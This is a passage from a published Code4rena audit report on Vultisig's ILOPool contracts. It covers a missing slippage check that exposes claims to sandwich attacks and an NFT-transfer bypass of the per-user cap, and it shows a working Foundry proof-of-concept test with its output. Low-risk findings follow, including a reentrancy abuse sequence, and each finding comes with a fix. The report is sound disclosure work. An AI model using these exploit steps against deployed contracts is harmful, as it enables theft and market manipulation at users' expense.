*Submitted by [rbserver](https://github.com/code-423n4/2024-06-vultisig-findings/issues/103), also found by [bigtone](https://github.com/code-423n4/2024-06-vultisig-findings/issues/189), [atoko](https://github.com/code-423n4/2024-06-vultisig-findings/issues/170), [crypticdefense](https://github.com/code-423n4/2024-06-vultisig-findings/issues/135), [Breeje](https://github.com/code-423n4/2024-06-vultisig-findings/issues/97), [cheatc0d3](https://github.com/code-423n4/2024-06-vultisig-findings/issues/74), [DanielArmstrong](https://github.com/code-423n4/2024-06-vultisig-findings/issues/60), [juancito](https://github.com/code-423n4/2024-06-vultisig-findings/issues/39), [jesjupyter](https://github.com/code-423n4/2024-06-vultisig-findings/issues/32), and [zraxx](https://github.com/code-423n4/2024-06-vultisig-findings/issues/152)*

Because the `claim` function does not have slippage controls for `amount0` and `amount1` returned by the `pool.burn` function call, the `claim` function call can suffer from price manipulation on the associated Uniswap v3 pool. If a price manipulation frontruns the `claim` transaction, the claimed token amounts can be much less than what they should be.

### Proof of Concept

When calling the following `claim` function, there are no slippage controls for `amount0` and `amount1` returned by the `pool.burn` function call. This is unlike Uniswap's `decreaseLiquidity` function below that does execute `require(amount0 >= params.amount0Min && amount1 >= params.amount1Min, 'Price slippage check')`, where `amount0` and `amount1` are also returned by the `pool.burn` function call. Thus, if a price manipulation on the associated Uniswap v3 pool frontruns the `claim` transaction, `amount0` and `amount1` can be much less than what they should be when the `claim` transaction is executed, which would cause the investor to claim token amounts that are much less than what they should be.

<https://github.com/code-423n4/2024-06-vultisig/blob/58ebda57ccf6a74bdef2b88eb18a62ec4ad46112/src/ILOPool.sol#L184-L261>

```solidity
    function claim(uint256 tokenId)
        external
        payable
        override
        isAuthorizedForToken(tokenId)
        returns (uint256 amount0, uint256 amount1)
    {
        // only can claim if the launch is successfully
        require(_launchSucceeded, "PNL");

        // calculate amount of unlocked liquidity for the position
        uint128 liquidity2Claim = _claimableLiquidity(tokenId);
        IUniswapV3Pool pool = IUniswapV3Pool(_cachedUniV3PoolAddress);
        Position storage position = _positions[tokenId];
        {
            IILOManager.Project memory _project = IILOManager(MANAGER).project(address(pool));

            uint128 positionLiquidity = position.liquidity;
            require(positionLiquidity >= liquidity2Claim);

            // get amount of token0 and token1 that pool will return for us
            (amount0, amount1) = pool.burn(TICK_LOWER, TICK_UPPER, liquidity2Claim);

            // get amount of token0 and token1 after deduct platform fee
            (amount0, amount1) = _deductFees(amount0, amount1, _project.platformFee);

            bytes32 positionKey = PositionKey.compute(address(this), TICK_LOWER, TICK_UPPER);

            // calculate amount of fees that position generated
            (, uint256 feeGrowthInside0LastX128, uint256 feeGrowthInside1LastX128, , ) = pool.positions(positionKey);
            uint256 fees0 = FullMath.mulDiv(
                                feeGrowthInside0LastX128 - position.feeGrowthInside0LastX128,
                                positionLiquidity,
                                FixedPoint128.Q128
                            );
            
            uint256 fees1 = FullMath.mulDiv(
                                feeGrowthInside1LastX128 - position.feeGrowthInside1LastX128,
                                positionLiquidity,
                                FixedPoint128.Q128
                            );

            // amount of fees after deduct performance fee
            (fees0, fees1) = _deductFees(fees0, fees1, _project.performanceFee);

            // fees is combined with liquidity token amount to return to the user
            amount0 += fees0;
            amount1 += fees1;

            position.feeGrowthInside0LastX128 = feeGrowthInside0LastX128;
            position.feeGrowthInside1LastX128 = feeGrowthInside1LastX128;

            // subtraction is safe because we checked positionLiquidity is gte liquidity2Claim
            position.liquidity = positionLiquidity - liquidity2Claim;
            ...
        }
        // real amount collected from uintswap pool
        (uint128 amountCollected0, uint128 amountCollected1) = pool.collect(
            address(this),
            TICK_LOWER,
            TICK_UPPER,
            type(uint128).max,
            type(uint128).max
        );
        ...
        // transfer token for user
        TransferHelper.safeTransfer(_cachedPoolKey.token0, ownerOf(tokenId), amount0);
        TransferHelper.safeTransfer(_cachedPoolKey.token1, ownerOf(tokenId), amount1);
        ...
        address feeTaker = IILOManager(MANAGER).FEE_TAKER();
        // transfer fee to fee taker
        TransferHelper.safeTransfer(_cachedPoolKey.token0, feeTaker, amountCollected0-amount0);
        TransferHelper.safeTransfer(_cachedPoolKey.token1, feeTaker, amountCollected1-amount1);
    }
```

<https://github.com/Uniswap/v3-periphery/blob/main/contracts/NonfungiblePositionManager.sol#L257-L306>

```solidity
    function decreaseLiquidity(DecreaseLiquidityParams calldata params)
        external
        payable
        override
        isAuthorizedForToken(params.tokenId)
        checkDeadline(params.deadline)
        returns (uint256 amount0, uint256 amount1)
    {
        require(params.liquidity > 0);
        Position storage position = _positions[params.tokenId];

        uint128 positionLiquidity = position.liquidity;
        require(positionLiquidity >= params.liquidity);

        PoolAddress.PoolKey memory poolKey = _poolIdToPoolKey[position.poolId];
        IUniswapV3Pool pool = IUniswapV3Pool(PoolAddress.computeAddress(factory, poolKey));
        (amount0, amount1) = pool.burn(position.tickLower, position.tickUpper, params.liquidity);

        require(amount0 >= params.amount0Min && amount1 >= params.amount1Min, 'Price slippage check');
        ...
    }
```

### Recommended Mitigation Steps

The `claim` function can be updated to include slippage controls for `amount0` and `amount1` returned by the `pool.burn` function call like what Uniswap's `decreaseLiquidity` function does.

### Assessed type

Invalid Validation

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-06-vultisig-findings/issues/103#issuecomment-2237646976):**
 > The submission outlines how the `ILOPool::claim` function does not impose any slippage checks on the liquidity withdrawal operation it performs. This is a valid observation as evidenced by the Uniswap V3 router itself and the existence of impermanent loss in Uniswap V3 pairs. A malicious user is able to execute sandwich attacks on `ILOPool::claim` operations which may result in the claim operation withdrawing more of one asset than the other (in most cases the token the ILO occurred for which, in theory, will be worth less than its paired counterpart intrinsically).
> 
> I believe a medium risk severity rating is appropriate given that value can be impacted as impermanent loss is realized during the withdrawal operation.


**[jarvisnn (Vultisig) acknowledged and commented](https://github.com/code-423n4/2024-06-vultisig-findings/issues/103#issuecomment-2242192717):**
> Acknowledged, however, if malicious user performs sandwich attack, they won't earn anything. In return sandwich attack only benefits more the LP owner.

***

## [[M-03] Transfer of `ILOPool` NFT token to different account allows for users to bypass the pool's `maxCapPerUser` invariant](https://github.com/code-423n4/2024-06-vultisig-findings/issues/58)
*Submitted by [0xb0k0](https://github.com/code-423n4/2024-06-vultisig-findings/issues/58), also found by [hals](https://github.com/code-423n4/2024-06-vultisig-findings/issues/221), [araj](https://github.com/code-423n4/2024-06-vultisig-findings/issues/194), [hakunamatata](https://github.com/code-423n4/2024-06-vultisig-findings/issues/145), [ke1caM](https://github.com/code-423n4/2024-06-vultisig-findings/issues/131), [GEEKS](https://github.com/code-423n4/2024-06-vultisig-findings/issues/126), [Nikki](https://github.com/code-423n4/2024-06-vultisig-findings/issues/125), [Aymen0909](https://github.com/code-423n4/2024-06-vultisig-findings/issues/123), [Ryonen](https://github.com/code-423n4/2024-06-vultisig-findings/issues/117), [carlitox477](https://github.com/code-423n4/2024-06-vultisig-findings/issues/95), [light](https://github.com/code-423n4/2024-06-vultisig-findings/issues/88), [Chinmay](https://github.com/code-423n4/2024-06-vultisig-findings/issues/86), [Spearmint](https://github.com/code-423n4/2024-06-vultisig-findings/issues/82), [LuarSec](https://github.com/code-423n4/2024-06-vultisig-findings/issues/55), [juancito](https://github.com/code-423n4/2024-06-vultisig-findings/issues/48), [jesjupyter](https://github.com/code-423n4/2024-06-vultisig-findings/issues/15), [dimulski](https://github.com/code-423n4/2024-06-vultisig-findings/issues/11), [Ack](https://github.com/code-423n4/2024-06-vultisig-findings/issues/2), [nnez](https://github.com/code-423n4/2024-06-vultisig-findings/issues/183), [h2134](https://github.com/code-423n4/2024-06-vultisig-findings/issues/175), [0x04bytes](https://github.com/code-423n4/2024-06-vultisig-findings/issues/156), [rbserver](https://github.com/code-423n4/2024-06-vultisig-findings/issues/105), and [Utsav](https://github.com/code-423n4/2024-06-vultisig-findings/issues/149)*

<https://github.com/code-423n4/2024-06-vultisig/blob/cb72b1e9053c02a58d874ff376359a83dc3f0742/src/ILOPool.sol#L143><br><https://github.com/code-423n4/2024-06-vultisig/blob/cb72b1e9053c02a58d874ff376359a83dc3f0742/src/ILOPool.sol#L151>

### Description

The `ILOPool` smart contract enables investors to acquire a locked liquidity position represented as an NFT. When an investor invokes the `buy()` function, they transfer a specified amount of `RAISE TOKENS` into the pool, thereby opening a position and receiving an `ILOPool NFT token` that signifies their ownership. The protocol enforces certain invariants related to the minimum and maximum amounts of `RAISE TOKENS` required for the sale. Furthermore, there is a restriction on the maximum number of tokens each investor can contribute per sale, defined by `maxCapPerUser`.

```solidity
struct InitPoolParams {
        address uniV3Pool;
        int24 tickLower; 
        int24 tickUpper;
        uint160 sqrtRatioLowerX96; 
        uint160 sqrtRatioUpperX96;
        uint256 hardCap; // total amount of raise tokens
        uint256 softCap; // minimum amount of raise token needed for launch pool
        uint256 maxCapPerUser; // TODO: user tiers
        uint64 start;
        uint64 end;

        // config for vests and shares. 
        // First element is always for investor 
        // and will mint nft when investor buy ilo
        VestingConfig[] vestingConfigs;
    }
```

Each subsequent call to `buy()` is intended to increase the investor's raised amount for their position, ensuring that the user's total raised amount does not surpass the sale's `maxCapPerUser`. However, this restriction can be circumvented by transferring an existing `ILOPool NFT token` to another account and invoking `buy()` again. This action results in the protocol minting a new NFT (thus creating a new position) for the investor. Consequently, the `maxCapPerUser` check applies to the new position's raised amount, rather than the total amount contributed by the investor.

```solidity
// If the investor already has a position, increase the raise amount and liquidity
// Otherwise, mint a new NFT for the investor and assign vesting schedules
@> if (balanceOf(recipient) == 0) { // The user can easily set their balance to 0
   _mint(recipient, (tokenId = _nextId++));
   _positionVests[tokenId].schedule = _vestingConfigs[0].schedule;
} else {
   tokenId = tokenOfOwnerByIndex(recipient, 0);
}

Position storage _position = _positions[tokenId];
@> require(raiseAmount <= saleInfo.maxCapPerUser - _position.raiseAmount, "UC"); // User can open multiple positions bypassing the `maxCapPerUser` constraint
_position.raiseAmount += raiseAmount;
```

### Impact

This vulnerability allows an investor to:

1. Bypass the `maxCapPerUser` constraint by transferring their NFT to another account and purchasing additional tokens, thus minting new NFTs and opening new positions, which in turn breaks a core invariant.
2. Prevent other investors from participating in the pool by monopolizing the contributions and reaching the pool's `hardCap`.

### Proof of Concept

The described issue is illustrated in the below test, which can be added to the current test suit in `ILOPool.t.sol` file and run with `forge test --mt testBypassUserCap`. I've added some helper-getter functions to be able to properly log what is happening in the workflow. I have used the defined set up parameters provided with the protocol's test suite.

```solidity
function testBypassUserCap() external {
        address alice = makeAddr("alice");
        address aliceSecondAccount = makeAddr("aliceSecondAccount");
        address bob = makeAddr("bob");

        _prepareBuyFor(alice);
        _prepareBuyFor(bob);

        console.log("Pool hard cap: ", IILOPool(iloPool).getSaleInfo().hardCap / 1e18);
        console.log("Pool max cap per user: ", IILOPool(iloPool).getSaleInfo().maxCapPerUser / 1e18);

        uint256 maxUserAmount = IILOPool(iloPool).getSaleInfo().maxCapPerUser;
        (uint256 tokenIdAlice, uint128 liquidityAlice) = _buyFor(alice, SALE_START + 1, maxUserAmount); // User buys the max cap

        console.log("Total raised after first buy from Alice:", IILOPool(iloPool).getTotalRaised() / 1e18);
        assertEq(IILOPool(iloPool).balanceOf(alice), 1);

        vm.prank(alice);
        ERC721(iloPool).transferFrom(alice, aliceSecondAccount, tokenIdAlice);

        assertEq(IILOPool(iloPool).balanceOf(alice), 0);
        assertEq(IILOPool(iloPool).balanceOf(aliceSecondAccount), 1);

        (uint256 tokenIdAliceSecond, uint128 liquidityAliceSecond) = _buyFor(alice, SALE_START + 1, 30000 ether); // User buys more than the max cap

        console.log("Total raised after second buy from Alice:", IILOPool(iloPool).getTotalRaised() / 1e18);
        assertEq(IILOPool(iloPool).balanceOf(alice), 1);

        vm.expectRevert(bytes("HC"));
        (uint256 tokenIdBob, uint128 liquidityBob) = _buyFor(bob, SALE_START + 1, 20000 ether); // A new investor wants to buy a position, but reverts

        assertEq(IILOPool(iloPool).balanceOf(bob), 0);

        _writeTokenBalance(SALE_TOKEN, iloPool, 95000 * 4 ether);
        vm.warp(SALE_END + 1);

        vm.prank(address(iloManager));
        IILOPool(iloPool).launch();

        vm.warp(VEST_END_1);

        vm.startPrank(aliceSecondAccount);
        ERC721(iloPool).transferFrom(aliceSecondAccount, alice, tokenIdAlice); // Alice gets her first token back
        vm.stopPrank();

        assertEq(IILOPool(iloPool).balanceOf(alice), 2);

        vm.startPrank(alice);
        IILOPool(iloPool).claim(tokenIdAlice);
        IILOPool(iloPool).claim(tokenIdAliceSecond);
        vm.stopPrank();

        assertGt(IERC20(SALE_TOKEN).balanceOf(alice), maxUserAmount);
    }
```

```
Ran 1 test for test/ILOPool.t.sol:ILOPoolTest
[PASS] testBypassUserCap() (gas: 3339405)
Logs:
  Pool hard cap:  100000
  Pool max cap per user:  60000
  Total raised after first buy from Alice: 60000
  Total raised after second buy from Alice: 90000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.65s (395.09ms CPU time)
```

### Recommended Mitigation Steps

Implement an internal tracking mechanism to specify if the investor has bought an NFT, instead of using `balanceOf(recipient) == 0`. Another thing would be to implement a tracking mechanism to aggregate the total raised amount by an individual investor across all their positions.

### Assessed type

Token-Transfer

**[Haupc (Vultisig) confirmed](https://github.com/code-423n4/2024-06-vultisig-findings/issues/58#event-13338014402)** 

**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-06-vultisig-findings/issues/58#issuecomment-2237649275):**
 > The Warden and its duplicates have demonstrated how the raise limitation per user can be effectively bypassed by transferring the NFT that the raise amounts are attached with to a different user, permitting one to circumvent the check and deposit as many funds as they wish.
> 
> Normally, a QA (L) severity rating would be assigned if the function was permissionless due to the ability of a user to use a secondary account to participate anyway. However, coupled with the fact that a whitelist may be enforced for raising operations, the impact of this submission has been properly assessed as medium-risk. 
> 
> A subset of this duplicate set has been awarded a 75% reward due to describing an incorrect alleviation, such as imposing a whitelist on the NFT transfers. This is insufficient, as a whitelisted user would be able to collude with another whitelisted user and transfer all NFTs to them (or even acquire whitelist access twice).

***

# Low Risk and Non-Critical Issues

For this audit, 5 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2024-06-vultisig-findings/issues/51) by **juancito** received the top score from the judge.

*The following wardens also submitted reports: [Breeje](https://github.com/code-423n4/2024-06-vultisig-findings/issues/204), [Rhaydden](https://github.com/code-423n4/2024-06-vultisig-findings/issues/205), [MrPotatoMagic](https://github.com/code-423n4/2024-06-vultisig-findings/issues/203), and [jesjupyter](https://github.com/code-423n4/2024-06-vultisig-findings/issues/36).*

## [01] Pools can be initialized with a price outside of the expected tick ranges

There is a wrong check in `initILOPool()` here: `sqrtRatioLowerX96 < sqrtRatioUpperX96`.

```solidity
require(sqrtRatioLowerX96 < _project.initialPoolPriceX96 && sqrtRatioLowerX96 < sqrtRatioUpperX96, "RANGE");
```

https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOManager.sol#L90

This means that an ILO Pool can be initialized with a price outside of the tick range, and it will be impossible for users to buy liquidity in the ILO Pool as the slippage check in `buy()` will revert.

It can be tested by replacing [this line](https://github.com/code-423n4/2024-06-vultisig/blob/main/test/IntegrationTestBase.sol#L81) to `tickUpper: MIN_TICK_500 + 10` and run any test that launches a pool.

### Recommendation

```diff
-   require(sqrtRatioLowerX96 < _project.initialPoolPriceX96 && sqrtRatioLowerX96 < sqrtRatioUpperX96, "RANGE");
+   require(sqrtRatioLowerX96 < _project.initialPoolPriceX96 && _project.initialPoolPriceX96 < sqrtRatioUpperX96, "RANGE");
```

## [02] Vestings can be created with end time lower than their start time

There is no check in [`_validateVestSchedule()`](https://github.com/code-423n4/2024-06-vultisig/blob/main/src/base/ILOVest.sol#L35) to prevent setting an `end` date before the `start` date. This could potentially be dangerous as it could cause an [underflow](https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOPool.sol#L427) when calculating the unlocked liquidity. 

Note: With the [current implementation](https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOPool.sol#L410-L417) the underflow is not possible as it would either `break`, or return the full amount of `shares`.

### Recommendation

Verify that the `end` time for each vesting is greater than its `start` time:

```diff
    function _validateVestSchedule(uint64 launchTime, LinearVest[] memory schedule) internal pure {
        require(schedule[0].start >= launchTime, "VT");
        uint16 BPS = 10000;
        uint16 totalShares;
        uint64 lastEnd;
        uint256 scheduleLength = schedule.length;
        for (uint256 i = 0; i < scheduleLength; i++) {
            // vesting schedule must not overlap
+           require(schedule[i].end >= schedule[i].start, "VT");
            require(schedule[i].start >= lastEnd, "VT");
            lastEnd = schedule[i].end;
            // we need to subtract first in order to avoid int overflow
            require(BPS - totalShares >= schedule[i].shares, "VS");
            totalShares += schedule[i].shares;
        }
        // total shares should be exactly equal BPS
        require(totalShares == BPS, "VS");
    }
```

## [03] Adversary can squat whitelist spots

`checkWhitelist()` verifies that `_whitelistIndex[to] > _allowedWhitelistIndex`:

```solidity
    if (_allowedWhitelistIndex == 0 || _whitelistIndex[to] > _allowedWhitelistIndex) {
        revert NotWhitelisted();
    }
```

https://github.com/code-423n4/2024-06-vultisig/blob/main/hardhat-vultisig/contracts/Whitelist.sol#L216

This works correctly while an admin whitelist is currently running. But the problem arrives when the whitelist is disabled, and allows anyone to register as a whitelisted user:

```solidity
    receive() external payable {
@>      if (_isSelfWhitelistDisabled) {
            revert SelfWhitelistDisabled();
        }
        if (_isBlacklisted[_msgSender()]) {
            revert Blacklisted();
        }
        _addWhitelistedAddress(_msgSender());
        payable(_msgSender()).transfer(msg.value);
    }
```

https://github.com/code-423n4/2024-06-vultisig/blob/main/hardhat-vultisig/contracts/Whitelist.sol#L66

This allows an attacker to squat whitelist spots, as the `_allowedWhitelistIndex` may not have been updated, not allowing more users to register as whitelist addresses.

### Recommendation

Depending on the intention of the protocol, one option is to take some fee for public whitelisting, or make sure that `_allowedWhitelistIndex` is increased to its max value when setting `_isSelfWhitelistDisabled` as `false`.

## [04] New ILO Pools can be created and initialized after a previous launch with the same Uniswap Pool

[`ILOManager::initILOPool()`](https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOManager.sol#L72) lets project owners create and initiate new ILO Pools after a successful previous launch.

Note: `launch()` requires that [all pools are launched successfully](https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOManager.sol#L193-L195), which won't be possible for the new one.

### Recommendation

Prevent project owners from calling `initILOPool()` after a successful launch.

## [05] `launchTime` and `refundDeadline` can be initialized in the past

`launchTime` can be set to a value `< block.timestamp`, and so `refundDeadline` as well in `initProject()`. Although,  `launchTime` is validated against the `project.end` value in `ILOManager::initILOPool()` and against the vesting `start` in `ILOVest::_validateVestSchedule()`.

Also, `refundDeadline` can overflow (as Solidity v0.7.6 is used), so a `launchTime` can be set into the far future, and overflow `refundDeadline` to be in the past.

```solidity
uint64 refundDeadline = params.launchTime + DEFAULT_DEADLINE_OFFSET;
```

https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOManager.sol#L58

### Recommendation

Validate that the launch time is in the future and that the refund deadline doesn't overflow.

## [06] Identical name and symbol for all pools

All ILO Pools have the same `name` and `symbol` which makes it less user friendly to navigate on offchain tools/explorers:

```solidity
function name() public pure override(ERC721, IERC721Metadata) returns (string memory) {
    return 'KRYSTAL ILOPool V1';
}

function symbol() public pure override(ERC721, IERC721Metadata) returns (string memory) {
    return 'KRYSTAL-ILO-V1';
}
```

https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOPool.sol#L53-L59

### Recommendation

Append the name of the `SALE_TOKEN` and `RAISE_TOKEN` to them.

## [07] Sale Tokens with transfer callbacks can be used to launch refundable pools

The `ILOPOOL` contract doesn't follow the Checks-Effects-Interactions pattern, and this could be abused by a pool creator.

1. Call `launch()` with a Sale Token with callback.
2. This will call `_refundProject()` and transfer the remaining Sale Tokens to the pool creator.
3. On the callback, call `claimRefund()` with a tokenId previously used to buy some tokens.
4. `_refundTriggered` will be set to true in the `refundable()` modifier.
5. `_launchSucceeded` will be set to true in `launch()`.
6. The launched pool is now both refundable and claimable.

Reference: https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOPool.sol#L332-L334

### Recommendation

Move the `_launchSucceeded` line before the token transfer:

```diff
+   _launchSucceeded = true;

    // transfer back leftover sale token to project admin
    _refundProject(_project.admin);

-   _launchSucceeded = true;
```

## [08] Re-entrant implementation of `whenNotInitialized`

By setting `_initialized = true` below `_;`, it allows functions with the `whenNotInitialized` modifier to be re-entered, since the re-entered functions will be all executed, until all set `_initialized = true` at the end:

```solidity
    modifier whenNotInitialized() {
        require(!_initialized);
        _;
@>      _initialized = true;
    }
```

https://github.com/code-423n4/2024-06-vultisig/blob/main/src/base/Initializable.sol#L13

### Recommendation

```diff
    modifier whenNotInitialized() {
        require(!_initialized);
+       _initialized = true;
        _;
-       _initialized = true;
    }
```

## [09] payable modifier on a function that shouldn't receive native tokens

The `claim()` function has a `payable` modifier despite it doesn't use `msg.value`, and the contract shouldn't receive native tokens. This may lead to user errors and lost ETH, as it can't be recovered.

```solidity
    function claim(uint256 tokenId)
        external
@>      payable
        override
        isAuthorizedForToken(tokenId)
        returns (uint256 amount0, uint256 amount1)
    {
```

https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOPool.sol#L186

### Recommendation

Consider removing the `payable` modifier.

## [10] Missing function to calculate how much liquidity a user will get on `buy()` and tokens on `claim()`

[`buy()`](https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOPool.sol#L126) operations involve some complex [calculations](https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOPool.sol#L155-L159) to get the returned liquidity.

[`claim()`](https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOPool.sol#L184) operations depend on [how many tokens the Uniswap pool will return](https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOPool.sol#L205-L224). And also [platform fees](https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOPool.sol#L208), and [performance fees](https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOPool.sol#L227).

### Recommendation

Create view functions for users to know beforehand how much liquidity or tokens they would obtain before they commit to a `buy()` or `claim()` operation blindly.

## [11] `maxCapPerUser` limit should not be enforced in public sales

A `maxCapPerUser` limit is always enforced when buying the initial liquidity via `buy()`, but this is only useful [during the whitelist period](https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOPool.sol#L133).

Once the whitelist is [Open for All](https://github.com/code-423n4/2024-06-vultisig/blob/main/src/base/ILOWhitelist.sol#L58C15-L58C16), anyone would be able to "bypass" this limit by using another account, so the check doesn't add any protection. In fact, it is counter-productive, as it limits the operations of the users.

https://github.com/code-423n4/2024-06-vultisig/blob/main/src/ILOPool.sol#L151

### Recommendation

Change the visibility of the `_openToAll` variable to `internal` and only validate the `maxCapPerUser` when it is not open for all:

```diff
+   if (!_openToAll) {
        require(raiseAmount <= saleInfo.maxCapPerUser - _position.raiseAmount, "UC");
+   }
```

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
